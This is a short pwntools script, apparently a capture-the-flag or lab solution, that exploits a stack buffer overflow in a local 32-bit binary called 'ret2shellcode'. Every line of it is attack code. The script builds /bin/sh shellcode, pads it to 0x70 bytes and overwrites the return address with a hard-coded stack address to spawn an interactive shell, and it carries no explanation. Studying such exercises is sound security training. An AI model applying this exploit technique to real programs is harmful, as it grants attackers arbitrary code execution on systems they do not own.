from pwn import *
context.arch="i386"
p = process("./ret2shellcode")
payload = asm(shellcraft.sh())
payload = payload.ljust(0x70, b"a")
p.sendline(payload + p32(0xffffd67c))
p.interactive()

# b *0x80485c6